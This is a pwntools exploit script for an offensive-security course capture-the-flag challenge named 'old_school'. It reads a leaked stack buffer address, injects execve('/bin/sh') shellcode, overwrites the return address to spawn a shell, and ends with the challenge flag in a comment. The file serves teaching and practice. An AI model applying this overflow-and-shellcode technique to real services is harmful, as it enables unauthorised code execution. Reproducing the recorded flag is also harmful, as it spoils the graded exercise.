from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

CHALLENGE = "./old_school"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1290
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

# p = gdb.debug(CHALLENGE, '''
#     b main
#     continue
# ''')

print(p.recvuntil(b": ").decode())
buf_addr = int(p.recvline().decode().strip(), 16)
log.info(f"Reveiving leaked buffer address: {hex(buf_addr)}")

e = ELF(CHALLENGE)
binsh_addr = e.symbols.just_a_string

shellcode = asm('''
    xor rdx, rdx      # rdx = NULL (envp pointer)
    mov rdi, {}       # rdi = address of "/bin/sh" string (pathname pointer)
    push rdi          # Push string address onto stack for argv[0]
    push rdx          # Push NULL onto stack for argv[1]
    mov rsi, rsp      # rsi = address of argv array ["/bin/sh", NULL] (argv pointer)
    mov rax, 0x3b     # execve syscall number
    syscall           # Call execve(rdi, rsi, rdx)
'''.format(binsh_addr), arch='amd64')

print(p.recvuntil(b"> ").decode())
msg = shellcode + b"A" * (0x38 - len(shellcode)) + p64(buf_addr)
p.sendline(msg)
log.info(f"Sending message in raw bytes: {msg}")

p.interactive()

# flag{th4t_buff3r_w4s_th3_p3rf3ct_pl4c3_t0_wr1t3_y0ur_sh3llc0de!_3cd7fb6d194ac904}
